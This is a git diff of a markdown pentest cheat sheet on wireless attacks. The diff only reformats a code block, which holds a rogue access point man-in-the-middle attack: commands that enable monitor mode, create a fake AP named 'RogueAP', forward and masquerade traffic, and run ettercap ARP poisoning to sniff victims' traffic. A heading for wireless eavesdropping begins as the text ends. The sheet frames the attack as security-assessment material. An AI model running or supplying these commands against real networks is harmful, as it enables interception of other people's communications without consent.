@@ -1,7 +1,7 @@
 # Advanced Wlan Techniques
 
 ## Man-in-the-Middle attack
-```bash
+
 Description:
 This attack sets up a rogue access point with the same SSID as a legitimate one,
 tricking clients into connecting. Once connected, the attacker can intercept, modify,
@@ -9,6 +9,8 @@ or redirect traffic. Use during security assessments to evaluate a network's res
 to rogue APs and traffic interception risks. It demonstrates the risks of trusting
 unsecured or spoofed access points and the importance of certificate pinning, VPNs,
 and user awareness.
+
+```bash
 airmon-ng start wlan0                                                # Enable monitor mode on the wlan0 interface
 airbase-ng -e RogueAP -c [channel] mon0                              # Create a fake AP named "RogueAP" on the specified channel
 ifconfig at0 up                                                      # Bring up the virtual interface created by airbase-ng
@@ -18,9 +20,8 @@ route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1      # Route tra
 echo 1 > /proc/sys/net/ipv4/ip_forward                               # Enable IP forwarding to relay traffic
 iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE                 # Masquerade traffic from at0 to external network via eth0
 ettercap -T -q -i at0 -M arp:remote // //                            # Launch ARP poisoning to intercept and sniff network traffic
-
-
 ```
+
 ## Wireless Eavesdropping
 ## Description:
 ## This passive attack involves capturing wireless packets in the air for later analysis.
